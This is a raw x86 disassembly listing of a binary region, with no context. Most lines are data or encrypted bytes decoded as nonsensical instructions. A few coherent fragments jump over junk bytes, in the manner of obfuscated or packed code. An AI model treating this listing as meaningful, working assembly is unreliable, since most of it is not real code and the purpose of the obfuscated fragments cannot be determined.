  40a8e5:	mov    al,ds:0x1c0cf890
  40a8ea:	iret   
  40a8eb:	sti    
  40a8ec:	lock mov al,ds:0x443e73fa
  40a8f2:	test   al,0x46
  40a8f4:	dec    eax
  40a8f5:	mov    ds:0x9d5c1dbf,eax
  40a8fa:	ds in  eax,0x51
  40a8fd:	sbb    al,0xef
  40a8ff:	inc    esi
  40a900:	out    0xb0,eax
  40a902:	div    BYTE PTR [ebp+0x3c059d]
  40a908:	mov    dl,0x34
  40a90a:	into   
  40a90b:	cmc    
  40a90c:	(bad)  
  40a90e:	dec    ebp
  40a90f:	inc    ebx
  40a910:	and    dl,BYTE PTR [edi+0x64]
  40a913:	mov    WORD PTR [esp+esi*1+0x4a],cs
  40a917:	mov    ebp,0x744a51da
  40a91c:	adc    eax,0xddd16e9a
  40a921:	lods   eax,DWORD PTR ds:[esi]
  40a922:	mov    DWORD PTR [eax],edi
  40a924:	mov    eax,DWORD PTR [ebp-0x14]
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR [ebx-0x25415dd3],ebp
  40a94c:	cmp    DWORD PTR [eax+0x78],0x74
  40a950:	jle    0x40a9ca
  40a952:	js     0x40a8e2
  40a954:	outs   dx,DWORD PTR ds:[esi]
  40a955:	xor    al,0xe1
  40a957:	lock sahf 
  40a959:	mov    edi,0x73ee031d
  40a95e:	loopne 0x40a96c
  40a960:	pop    edx
  40a961:	adc    al,0xa0
  40a963:	(bad)  
  40a965:	jne    0x40a94f
  40a967:	push   0xadc609d8
  40a96c:	add    eax,DWORD PTR gs:[ebx]
  40a96f:	jns    0x40a8ff
  40a971:	sub    BYTE PTR [ebx+0x4a2461b0],al
  40a977:	loope  0x40a905
  40a979:	mov    bh,0x28
  40a97b:	xor    al,0x21
  40a97d:	fcomip st,st(4)
  40a97f:	adc    ebx,DWORD PTR [edi]
  40a981:	mov    ch,0x6f
  40a983:	imul   esp,DWORD PTR [esi+0x686d03fc],0x56a6b1d2
  40a98d:	xor    al,0x68
  40a98f:	fldl2e 
  40a991:	push   ebx
  40a992:	xor    al,0x5c
  40a994:	ss ss xor eax,0x43963b1c
  40a99b:	bound  esp,QWORD PTR [edi]
  40a99d:	jmp    0xcf359e52
  40a9a2:	arpl   di,cx
  40a9a4:	fimul  WORD PTR [edx]
  40a9a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a7:	in     al,0xfd
  40a9a9:	popa   
  40a9aa:	mov    al,0x1d
  40a9ac:	pop    ebx
  40a9ad:	dec    ebp
  40a9ae:	push   0x3ca7c78a
  40a9b3:	scas   eax,DWORD PTR es:[edi]
  40a9b4:	sti    
  40a9b5:	cmp    al,0xa0
  40a9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9b8:	cmp    al,0xab
  40a9ba:	shl    BYTE PTR [ecx-0x5da57937],1
  40a9c0:	mov    edi,0x64fa716c
  40a9c5:	sbb    eax,0xe15291ac
  40a9ca:	push   es
  40a9cb:	pop    ds
  40a9cc:	dec    esi
  40a9cd:	int3   
  40a9ce:	lds    esi,FWORD PTR [ebx-0x210d43bb]
  40a9d4:	sbb    DWORD PTR [ebp+0xa],0x71
  40a9d8:	ret    
  40a9d9:	pop    ebx
  40a9da:	addr16 pop esp
  40a9dc:	xchg   DWORD PTR [ebp+ebx*8+0x5a7e2d8e],ebx
  40a9e3:	mov    ebp,0x56574fbd
  40a9e8:	repz mov cl,0x83
  40a9eb:	int3   
  40a9ec:	xchg   edi,eax
  40a9ed:	mov    cl,0xcd
  40a9ef:	dec    esp
  40a9f0:	sar    DWORD PTR [ecx-0x18cd7cd9],1
  40a9f6:	mov    eax,0xb0cfea3
  40a9fb:	repz addr16 ret 
  40a9fe:	adc    BYTE PTR [eax+0x7b55fd90],bh
  40aa04:	imul   ebp,DWORD PTR [ebx-0x197cc00a],0x20
  40aa0b:	xor    edx,eax
  40aa0d:	inc    edi
  40aa0e:	arpl   WORD PTR [esi+esi*8],di
  40aa11:	ja     0x40aa21
  40aa13:	sbb    esi,ebx
  40aa15:	inc    esp
  40aa16:	jbe    0x40a9b0
  40aa18:	sahf   
  40aa19:	inc    eax
  40aa1a:	xchg   edi,eax
  40aa1b:	push   esp
  40aa1c:	test   eax,0x62b14165
  40aa21:	sti    
  40aa22:	cdq    
  40aa23:	sbb    eax,0x68f1539f
  40aa28:	inc    ebx
  40aa29:	js     0x40a9eb
  40aa2b:	sbb    BYTE PTR [edi-0x62066e1b],ch
  40aa31:	jnp    0x40aa0b
  40aa33:	(bad)  
  40aa34:	or     ah,dl
  40aa36:	mov    ebp,0xc5750030
  40aa3b:	xlat   BYTE PTR ds:[ebx]
  40aa3c:	mov    ecx,0xecba287b
  40aa41:	xor    al,ch
  40aa43:	mov    DWORD PTR [edx-0x3d39cce2],ebx
  40aa49:	cwde   
  40aa4a:	or     BYTE PTR [esi],dl
  40aa4c:	pop    edx
  40aa4d:	call   0x3ce3:0x1f74e25a
  40aa54:	in     eax,0xa
  40aa56:	shl    DWORD PTR [edi],cl
  40aa58:	pop    ebx
  40aa59:	mov    DWORD PTR [ebx],edx
  40aa5b:	push   eax
  40aa5c:	cmc    
  40aa5d:	xchg   BYTE PTR [edx],bh
  40aa5f:	repnz test BYTE PTR [eax],cl
  40aa62:	fsub   DWORD PTR [edx+edx*2+0x523169d8]
  40aa69:	push   0xffffffaa
  40aa6b:	add    eax,0x6bf1ab35
  40aa70:	leave  
  40aa71:	add    ch,BYTE PTR [edi+0x7a]
  40aa74:	inc    eax
  40aa75:	and    al,0x8a
  40aa77:	push   0x50
  40aa79:	jno    0x40aac7
  40aa7b:	cli    
  40aa7c:	dec    edx
  40aa7d:	addr16 jo 0x40aa0b
  40aa80:	stc    
  40aa81:	add    eax,0x2cc7ec7
  40aa86:	(bad)  
  40aa87:	rcr    BYTE PTR [eax-0x39],1
  40aa8a:	cwde   
  40aa8b:	or     al,BYTE PTR [eax]
  40aa8d:	jo     0x40aa75
  40aa8f:	sub    al,0xca
  40aa91:	push   ss
  40aa92:	sti    
  40aa93:	inc    DWORD PTR [ebx-0x2d]
  40aa96:	outs   dx,BYTE PTR ds:[esi]
  40aa97:	ret    
  40aa98:	loope  0x40aaf3
  40aa9a:	inc    eax
  40aa9b:	sti    
  40aa9c:	push   ebp
  40aa9d:	mov    al,0x1
  40aa9f:	sbb    BYTE PTR [ebp-0x62],cl
  40aaa2:	rcr    BYTE PTR [ebx+0x77789a10],cl
  40aaa8:	cmp    DWORD PTR [ecx],eax
  40aaaa:	data16 sub bl,bh
  40aaad:	or     dh,BYTE PTR [ebx]
  40aaaf:	dec    ebp
  40aab0:	int    0xf9
  40aab2:	xchg   ebx,eax
  40aab3:	rol    DWORD PTR [edx-0x72],0xb
  40aab7:	lea    ecx,[eiz*2-0x3c239e08]
  40aabe:	mov    bh,0xb6
  40aac0:	pusha  
  40aac1:	mov    edx,DWORD PTR [ebp-0xb]
  40aac4:	push   ds
  40aac5:	jge    0x40aaad
  40aac7:	sahf   
  40aac8:	mov    ch,0x7d
  40aaca:	mov    eax,ds:0x76a449b0
  40aacf:	jbe    0x40aaa3
  40aad1:	add    eax,0xc38a8047
  40aad6:	out    0x3f,al
  40aad8:	pop    ebx
  40aad9:	rcl    BYTE PTR [ebp-0x1fba6fb8],cl
  40aadf:	pop    ecx
  40aae0:	fs sub eax,0x3ede0b53
  40aae6:	jns    0x40aadf
  40aae8:	adc    bh,BYTE PTR [esi]
  40aaea:	inc    ebx
  40aaeb:	call   FWORD PTR [edi-0x7d]
  40aaee:	cmc    
  40aaef:	xlat   BYTE PTR ds:[ebx]
  40aaf0:	pop    ecx
  40aaf1:	cmp    dl,BYTE PTR es:[eax]
  40aaf4:	cwde   
  40aaf5:	adc    DWORD PTR [edi-0xd],edx
  40aaf8:	or     ebx,ecx
  40aafa:	inc    esp
  40aafb:	inc    ebp
  40aafc:	pop    ss
  40aafd:	xor    al,0x78
  40aaff:	jns    0x40ab30
  40ab01:	call   0x3b6b4a8a
  40ab06:	xor    BYTE PTR [ebx-0x58861395],0x93
  40ab0d:	pop    esi
  40ab0e:	shr    esi,1
  40ab10:	aas    
  40ab11:	inc    eax
  40ab12:	stos   DWORD PTR es:[edi],eax
  40ab13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab14:	aaa    
  40ab15:	in     al,dx
  40ab16:	stos   DWORD PTR es:[edi],eax
  40ab17:	out    0x62,al
  40ab19:	in     al,0x5c
  40ab1b:	js     0x40ab09
  40ab1d:	add    al,0x89
  40ab1f:	in     eax,dx
  40ab20:	push   0xd1966661
  40ab25:	je     0x40ab87
  40ab27:	and    al,0x72
  40ab29:	add    dl,0xd7
  40ab2c:	sbb    al,al
  40ab2e:	ret    0x87ea
  40ab31:	or     cl,ch
  40ab33:	jbe    0x40aab5
  40ab35:	xchg   esi,eax
  40ab36:	stos   BYTE PTR es:[edi],al
  40ab37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab38:	xchg   DWORD PTR [eax],ecx
  40ab3a:	cmc    
  40ab3b:	mov    esp,0xd94a3bfc
  40ab40:	mov    bl,0xf7
  40ab42:	fbld   TBYTE PTR [edi-0x31fb17bb]
  40ab48:	mov    WORD PTR [ebx],ds
  40ab4a:	mov    ds:0x89ed0fcd,al
  40ab4f:	add    eax,0x4a932a85
  40ab54:	adc    dl,BYTE PTR [eax+ebx*2]
  40ab57:	xor    bl,BYTE PTR [edx+ebp*1-0x76d08275]
  40ab5e:	mov    DWORD PTR [edi],ebp
  40ab60:	sar    DWORD PTR [ebx-0x355a5559],0x6d
  40ab67:	jecxz  0x40ab9f
  40ab69:	in     al,0xdc
  40ab6b:	and    DWORD PTR [ecx-0x203cacb],0x3bf59fe6
  40ab75:	test   DWORD PTR [ecx+0x18],0x9b370009
  40ab7c:	add    al,0x63
  40ab7e:	test   BYTE PTR [edi-0x2d9eab2c],bh
  40ab84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab85:	xchg   DWORD PTR gs:[ebp+0x3343723b],esp
  40ab8c:	xchg   DWORD PTR [edi],edi
  40ab8e:	cmp    BYTE PTR [edi+0x34],0xac
  40ab92:	inc    edx
  40ab93:	inc    ebp
  40ab94:	add    cl,BYTE PTR [edx-0x2c]
  40ab97:	or     dh,al
  40ab99:	(bad)  
  40ab9a:	and    dl,bh
  40ab9c:	add    esp,eax
  40ab9e:	pop    eax
  40ab9f:	fwait
  40aba0:	ss mov ah,0x61
  40aba3:	and    cl,BYTE PTR [ebp+0x6986a9]
  40aba9:	push   eax
  40abaa:	and    ch,0xdb
  40abad:	les    esp,FWORD PTR [ebx]
  40abaf:	mov    cl,0xb7
  40abb1:	cmp    eax,0x4717df84
  40abb6:	inc    ebp
  40abb7:	and    al,0xae
  40abb9:	lea    ecx,[ebx-0x44]
  40abbc:	repnz stos DWORD PTR es:[edi],eax
  40abbe:	scas   al,BYTE PTR es:[edi]
  40abbf:	aaa    
  40abc0:	aaa    
  40abc1:	popa   
  40abc2:	jecxz  0x40ab8f
  40abc4:	cmp    al,0x50
  40abc6:	ss push esp
  40abc8:	nop
  40abc9:	jge    0x40ab55
  40abcb:	into   
  40abcc:	xchg   ebx,eax
  40abcd:	icebp  
  40abce:	sub    dl,BYTE PTR [edi]
  40abd0:	out    0x10,eax
  40abd2:	sbb    eax,0xfc2c539f
  40abd7:	mov    ebp,0x9f68462a
  40abdc:	lahf   
  40abdd:	in     al,dx
  40abde:	call   0xaa06:0xc65a0a74
  40abe5:	(bad)  ds:0xc42c5cee
  40abeb:	mov    dl,0x81
  40abed:	dec    ebp
  40abee:	jmp    0x1d6742fd
  40abf3:	sar    esp,1
  40abf5:	mov    eax,ds:0x81105ae9
  40abfa:	mov    DWORD PTR [ecx],ecx
  40abfc:	repnz inc eax
  40abfe:	push   ss
  40abff:	leave  
  40ac00:	aaa    
  40ac01:	add    ecx,DWORD PTR [esi-0x27875648]
  40ac07:	jmp    0xca70166e
  40ac0c:	mov    ah,0x3a
  40ac0e:	mov    dl,cl
  40ac10:	sbb    BYTE PTR [ebx],bh
  40ac12:	jg     0x40ac38
  40ac14:	fwait
  40ac15:	popf   
  40ac16:	aaa    
  40ac17:	pop    ebx
  40ac18:	dec    esp
  40ac19:	push   cs
  40ac1a:	cmp    ecx,DWORD PTR [eax-0x25def2f]
  40ac20:	enter  0x1ceb,0x3e
  40ac24:	adc    bl,dh
  40ac26:	xchg   edi,eax
  40ac27:	sbb    eax,0x573cabf1
  40ac2c:	test   DWORD PTR [esi-0x5b],ebx
  40ac2f:	mov    ?,WORD PTR [edx]
  40ac31:	sub    eax,0x63519ec0
  40ac36:	sbb    edx,esp
  40ac38:	mov    ecx,0x87e6c0e6
  40ac3d:	sbb    BYTE PTR [edx-0x68],ah
  40ac40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac41:	cmp    ah,bl
  40ac43:	lea    edi,[eax-0x80]
  40ac46:	gs push ss
  40ac48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac49:	(bad)  [edx]
  40ac4b:	add    al,0x90
  40ac4d:	je     0x40ac22
  40ac4f:	xor    ebx,ecx
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	(bad)  
  40ac8d:	lds    esi,FWORD PTR [edi+ebx*4+0x787880d6]
  40ac94:	je     0x40ad14
  40ac96:	js     0x40ad10
  40ac98:	test   BYTE PTR [esi],0xc2
  40ac9b:	adc    DWORD PTR [ebx+eax*8],ecx
  40ac9e:	ficom  WORD PTR [ecx]
  40aca0:	iret   
  40aca1:	pushw  cs
  40aca3:	scas   eax,DWORD PTR es:[edi]
  40aca4:	into   
  40aca5:	adc    ebx,DWORD PTR ds:0x17358fcf
  40acab:	xor    edi,DWORD PTR [ebx+0x133aab11]
  40acb1:	mov    DWORD PTR [esi+0x6a1156e3],0x788a9af5
  40acbb:	adc    eax,0x66d8f00f
  40acc0:	pop    esi
  40acc1:	add    al,0xb7
  40acc3:	mov    al,ds:0x2f163cb8
  40acc8:	int    0x1
  40acca:	mov    esp,0x9f9d527a
  40accf:	or     BYTE PTR [eax+0x603e506b],0xc5
  40acd6:	ss in  al,dx
  40acd8:	std    
  40acd9:	call   0x4bb3:0x8c5e6238
  40ace0:	xchg   esi,eax
  40ace1:	imul   ebp,DWORD PTR [eax+edx*1+0xd],0xfffffff3
  40ace6:	js     0x40ac7b
  40ace8:	mov    al,0x1d
  40acea:	add    eax,0x94e244b5
  40acef:	inc    ebp
  40acf0:	add    cl,dh
  40acf2:	ja     0x40ad57
  40acf4:	stos   DWORD PTR es:[edi],eax
  40acf5:	adc    DWORD PTR [esi],ecx
  40acf7:	loopne 0x40ad03
  40acf9:	xor    DWORD PTR [esi+0x2d66bfd2],edi
  40acff:	mov    esp,0x558d7dd5
  40ad04:	cmp    esp,DWORD PTR [ecx-0x3869b5ff]
  40ad0a:	sahf   
  40ad0b:	pop    ss
  40ad0c:	jns    0x40ad24
  40ad0e:	jne    0x40ad60
  40ad10:	push   ebx
  40ad11:	dec    edi
  40ad12:	les    edx,FWORD PTR [edi+0x5692b891]
  40ad18:	iret   
  40ad19:	scas   al,BYTE PTR es:[edi]
  40ad1a:	pop    ds
  40ad1b:	xor    bl,BYTE PTR [ebx+0x44]
  40ad1e:	or     cl,BYTE PTR [ebx+0x24bdaa4b]
  40ad24:	lahf   
  40ad25:	mov    bl,0x18
  40ad27:	out    0x51,al
  40ad29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad2a:	jl     0x40ad62
  40ad2c:	addr16 ret 0x211b
  40ad30:	call   eax
  40ad32:	mov    ds:0x26f78a47,al
  40ad37:	das    
  40ad38:	pop    esi
  40ad39:	inc    si
  40ad3b:	cli    
  40ad3c:	in     eax,dx
  40ad3d:	xor    eax,0xa5823617
  40ad42:	jns    0x40accf
  40ad44:	cmp    eax,esp
  40ad46:	jnp    0x40ad3e
  40ad48:	fisubr DWORD PTR [edx-0x25fec67c]
  40ad4e:	shl    DWORD PTR [edi],1
  40ad50:	stos   BYTE PTR es:[edi],al
  40ad51:	pushf  
  40ad52:	mov    eax,ecx
  40ad54:	mov    bh,0x8c
  40ad56:	jmp    0x40ad9f
  40ad58:	clc    
  40ad59:	sub    edi,DWORD PTR [ebp+ebp*1-0x7b]
  40ad5d:	cs aas 
  40ad5f:	sub    BYTE PTR [ebp-0xd7561b3],cl
  40ad65:	pop    ss
  40ad66:	sub    edx,DWORD PTR [ecx-0x2d]
  40ad69:	sub    bh,BYTE PTR [esi]
  40ad6b:	dec    eax
  40ad6c:	les    edx,FWORD PTR [ecx+eax*4-0x68]
  40ad70:	pop    ds
  40ad71:	jno    0x40ad7d
  40ad73:	add    edi,DWORD PTR [ecx-0x42dce98d]
  40ad79:	daa    
  40ad7a:	jne    0x40adb1
  40ad7c:	push   ss
  40ad7d:	and    eax,0xd8874fa6
  40ad82:	ins    DWORD PTR es:[edi],dx
  40ad83:	pop    ss
  40ad84:	push   ebp
  40ad85:	lods   eax,DWORD PTR ss:[esi]
  40ad87:	xor    bl,BYTE PTR [edi]
  40ad89:	ficomp WORD PTR [ecx]
  40ad8b:	mov    ah,0x44
  40ad8d:	and    edx,DWORD PTR [edx-0x79]
  40ad90:	cs cs or dh,0x3c
  40ad95:	aaa    
  40ad96:	mov    eax,0x44b7aa7a
  40ad9b:	int3   
  40ad9c:	pushf  
  40ad9d:	push   edi
  40ad9e:	or     ah,BYTE PTR [ebx-0x7b]
  40ada1:	inc    esi
  40ada2:	jno    0x40ae07
  40ada4:	daa    
  40ada5:	jg     0x40ad56
  40ada7:	loope  0x40adcb
  40ada9:	clc    
  40adaa:	rcl    esi,0xbd
  40adad:	in     al,dx
  40adae:	inc    ebp
  40adaf:	jns    0x40ad66
  40adb1:	mov    BYTE PTR [ecx],dl
  40adb3:	jb     0x40ad4c
  40adb5:	xor    BYTE PTR [ebp+0x566de763],ch
  40adbb:	ins    DWORD PTR es:[edi],dx
  40adbc:	fbstp  TBYTE PTR [edx]
  40adbe:	pop    esi
  40adbf:	inc    eax
  40adc0:	mov    dl,0x93
  40adc2:	adc    al,0xbb
  40adc4:	rol    BYTE PTR [eax],0x2f
  40adc7:	lea    ecx,[ebx+0x6]
  40adca:	xor    esi,DWORD PTR [eax+ebp*4-0x3b6ed3eb]
  40add1:	popf   
  40add2:	fs mov ebx,0x48a9dc18
  40add8:	and    edi,0x11
  40addb:	adc    DWORD PTR [ebp+ecx*2+0x23],edx
  40addf:	dec    ecx
  40ade0:	daa    
  40ade1:	aaa    
  40ade2:	mov    cl,BYTE PTR [esi]
  40ade4:	xchg   esi,eax
  40ade5:	js     0x40ae06
  40ade7:	daa    
  40ade8:	clc    
  40ade9:	(bad)  
  40adea:	out    dx,eax
  40adeb:	xor    eax,0x12f3aba3
  40adf0:	out    dx,eax
  40adf1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40adf3:	(bad)  
  40adf4:	daa    
  40adf5:	mov    BYTE PTR [eax-0x7f309a5e],cl
  40adfb:	fcom   st(7)
  40adfd:	daa    
  40adfe:	pop    ebp
  40adff:	sub    eax,edi
  40ae01:	pop    edi
  40ae02:	push   esi
  40ae03:	cmp    eax,0x9d6b83c6
  40ae08:	push   cs
  40ae09:	mov    cl,0x3d
  40ae0b:	out    dx,eax
  40ae0c:	fdivr  DWORD PTR fs:[ebp-0x31]
  40ae10:	test   bh,al
  40ae12:	cmp    esi,edi
  40ae14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae15:	fdiv   QWORD PTR [ebx-0x60b94976]
  40ae1b:	stos   DWORD PTR es:[edi],eax
  40ae1c:	xor    edx,DWORD PTR [ebp-0x19c32da7]
  40ae22:	push   0x28
  40ae24:	mov    bl,0x57
  40ae26:	jnp    0x40adbb
  40ae28:	mov    ds:0x884ad2df,al
  40ae2d:	and    eax,0x1f2e64c8
  40ae32:	pop    esp
  40ae33:	stc    
  40ae34:	stc    
  40ae35:	push   ds
  40ae36:	sbb    cl,BYTE PTR [ecx-0xc693f89]
  40ae3c:	sbb    al,0xe1
  40ae3e:	sbb    DWORD PTR [ebx-0x69968602],edi
  40ae44:	lds    eax,FWORD PTR [esi+0x68]
  40ae47:	ds mov edx,0x33e00be
  40ae4d:	fmul   QWORD PTR [ecx]
  40ae4f:	sbb    al,0x2c
  40ae51:	test   bl,dl
  40ae53:	push   0xffffffca
  40ae55:	inc    eax
  40ae56:	mov    ds:0xcdc3c08c,eax
  40ae5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae5c:	mov    ah,0xfe
  40ae5e:	add    esi,DWORD PTR [eax+0x3a954c23]
  40ae64:	jno    0x40ae80
  40ae66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae67:	mov    ecx,0x623b7fba
  40ae6c:	mov    ecx,0xed48d32a
  40ae71:	dec    edx
  40ae72:	cmp    esi,ebp
  40ae74:	fild   QWORD PTR [edx+0x5bfbdb19]
  40ae7a:	inc    edi
  40ae7b:	nop
  40ae7c:	cmp    DWORD PTR [edi-0x7298314e],ebx
  40ae82:	pop    ss
  40ae83:	stc    
  40ae84:	std    
  40ae85:	or     ah,BYTE PTR ds:0xa6f2feca
  40ae8b:	push   cs
  40ae8c:	jge    0x40ae3e
  40ae8e:	push   0x2c
  40ae90:	(bad)  
  40ae92:	mov    ds:0xd325fc64,al
  40ae97:	sar    BYTE PTR [edi+0x6f],cl
  40ae9a:	pop    ss
  40ae9b:	jl     0x40ae3b
  40ae9d:	fcomp  DWORD PTR [eax]
  40ae9f:	inc    eax
  40aea0:	pop    es
  40aea1:	lea    esi,[ecx+0x2c94631c]
  40aea7:	inc    edi
  40aea8:	mov    edi,DWORD PTR [edi+0x64]
  40aeab:	mov    esi,0x273e6732
  40aeb0:	push   es
  40aeb1:	stos   BYTE PTR es:[edi],al
  40aeb2:	push   ds
  40aeb3:	fs scas eax,DWORD PTR es:[edi]
  40aeb5:	mov    edi,0xfe090c82
  40aeba:	push   ss
  40aebb:	and    al,cl
  40aebd:	mov    ecx,DWORD PTR [ecx-0x61]
  40aec0:	mov    al,ds:0x759782a0
  40aec5:	pop    ss
  40aec6:	imul   eax,esi,0xffffff8c
  40aec9:	retf   
  40aeca:	xchg   esp,eax
  40aecb:	mov    ah,0x84
  40aecd:	inc    esp
  40aece:	xor    DWORD PTR ds:0xbcd7632f,ebp
  40aed4:	cmp    eax,0x6afa73cb
  40aed9:	sbb    DWORD PTR [edi-0x64d5453],esp
  40aedf:	and    eax,0x78fe48da
  40aee4:	xor    eax,0x578632
  40aee9:	pusha  
  40aeea:	and    eax,DWORD PTR [eax+0x2f]
  40aeed:	lods   eax,DWORD PTR ds:[esi]
  40aeee:	xchg   BYTE PTR [ecx+0xf9bb44e],dl
  40aef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aef5:	jne    0x40aeb2
  40aef7:	enter  0xa24e,0xae
  40aefb:	lock gs jae 0x40aee7
  40aeff:	sub    ah,BYTE PTR [ebp+0x56]
  40af02:	fwait
  40af03:	xor    BYTE PTR [esi+0x64],bl
  40af06:	jmp    0x40af21
  40af08:	dec    edx
  40af09:	cld    
  40af0a:	mov    ds:0xe4822ef,al
  40af0f:	cmp    eax,0x4a9306f4
  40af14:	das    
  40af15:	or     DWORD PTR [esp+edi*8+0x49],0xbfb3efd8
  40af1d:	jb     0x40af04
  40af1f:	xchg   edx,eax
  40af20:	mov    ebx,0xe6b71a95
  40af25:	push   esi
  40af26:	push   esp
  40af27:	dec    esi
  40af28:	mov    ds:0x158601b1,al
  40af2d:	jmp    0x3444b255
  40af32:	sbb    ebp,eax
  40af34:	inc    eax
  40af35:	add    DWORD PTR [ebx-0x3859c752],0xbd7ce8a3
  40af3f:	dec    esp
  40af40:	mov    ah,0x19
  40af42:	adc    edx,DWORD PTR ds:0x3cae9925
  40af48:	mov    ebp,0x7b09def2
  40af4d:	lock call 0xe2255b64
  40af53:	dec    edi
  40af54:	sbb    eax,0xd39d55f0
  40af59:	ret    
  40af5a:	inc    edi
  40af5b:	jp     0xb853bcc4
  40af61:	add    DWORD PTR [esi+0x12df14b6],ecx
  40af67:	pop    edx
  40af68:	aaa    
  40af69:	jnp    0x40af1d
  40af6b:	jle    0x40af20
  40af6d:	sahf   
  40af6e:	dec    edx
  40af6f:	repz icebp 
  40af71:	mov    cl,0x80
  40af73:	mov    bh,0xd9
  40af75:	ins    DWORD PTR es:[edi],dx
  40af76:	sub    edx,DWORD PTR ds:0xd9af328e
  40af7c:	xor    DWORD PTR [edx-0x35],ebp
  40af7f:	das    
  40af80:	push   ebp
  40af81:	xchg   BYTE PTR [edx+0x7998a464],ah
  40af87:	stc    
  40af88:	retf   0xe19d
  40af8b:	enter  0x67c9,0x6b
  40af8f:	imul   ebp,eax,0xfffffff5
  40af92:	and    ah,BYTE PTR [ebx-0x2d96ef75]
  40af98:	in     eax,dx
  40af99:	test   eax,0x1089f89e
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	ss cli 
  40afb4:	add    eax,0x7885d2b7
  40afb9:	js     0x40b02f
  40afbb:	jle    0x40b035
  40afbd:	js     0x40afd3
  40afbf:	sub    BYTE PTR [ebp-0x16],cl
  40afc2:	mov    WORD PTR [edi-0x7333d7c6],ds
  40afc8:	xor    al,0x29
  40afca:	les    eax,FWORD PTR [ebp-0x52]
  40afcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afce:	push   cs
  40afcf:	frstor [edi+0x17]
  40afd2:	pop    esi
  40afd3:	jle    0x40af97
  40afd5:	je     0x40afad
  40afd7:	add    al,0xf5
  40afd9:	cmp    cl,BYTE PTR [edi+0x60]
  40afdc:	or     ch,BYTE PTR [edx]
  40afde:	inc    ecx
  40afdf:	nop
  40afe0:	push   eax
  40afe1:	xor    ebp,DWORD PTR [edx+0x6723db45]
  40afe7:	inc    ebp
  40afe8:	cmp    edi,DWORD PTR [esi+0x358e3379]
  40afee:	fisub  DWORD PTR ds:0xacfb6820
  40aff4:	push   ss
  40aff5:	fs in  al,0xf4
  40aff8:	(bad)  
  40aff9:	out    dx,al
  40affa:	test   al,0xaa
  40affc:	or     BYTE PTR [ebx-0x47],ch
  40afff:	not    DWORD PTR [edi-0x66]
  40b002:	sbb    BYTE PTR [eax+0x48],0x2c
  40b006:	push   eax
  40b007:	(bad)  
  40b008:	sti    
  40b009:	pop    es
  40b00a:	lea    ebx,[ebp-0x3e1fe88a]
  40b010:	stos   BYTE PTR es:[edi],al
  40b011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b012:	pop    ebp
  40b013:	clc    
  40b014:	pop    edx
  40b015:	push   esp
  40b016:	cli    
  40b017:	loopne 0x40b041
  40b019:	xor    BYTE PTR [edi+0x6bae1bd7],0x8f
  40b020:	fild   QWORD PTR [ebx]
  40b022:	push   edi
  40b023:	sbb    BYTE PTR [ebx-0x59c1837],bh
  40b029:	outs   dx,BYTE PTR ds:[esi]
  40b02a:	add    ah,bl
  40b02c:	rol    BYTE PTR [edx+ebp*2+0x186f1811],1
  40b033:	(bad)  
  40b034:	out    0x4a,al
  40b036:	sbb    al,0x3e
  40b038:	jmp    0x40b065
  40b03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b03b:	dec    eax
  40b03c:	lods   al,BYTE PTR ds:[esi]
  40b03d:	fs retf 
  40b03f:	or     cl,BYTE PTR [esi+ebx*1]
  40b042:	adc    DWORD PTR [eax-0x7255bbf1],0x19
  40b049:	cmp    eax,0xb1075883
  40b04e:	mov    ah,0xdc
  40b050:	sub    al,0x2c
  40b052:	(bad)  
  40b053:	push   0x640e4229
  40b058:	sub    dh,dh
  40b05a:	into   
  40b05b:	add    BYTE PTR [eax-0x5555733f],dh
  40b061:	inc    edx
  40b062:	enter  0x4c31,0x2e
  40b066:	div    BYTE PTR [edx-0x66]
  40b069:	popa   
  40b06a:	(bad)  
  40b06b:	sbb    al,0xb9
  40b06d:	mov    ds:0x7c194174,al
  40b072:	pusha  
  40b073:	push   ecx
  40b074:	push   ss
  40b075:	or     DWORD PTR [edi-0x242e9415],0xffffffa8
  40b07c:	mov    ds:0x6e2138c7,eax
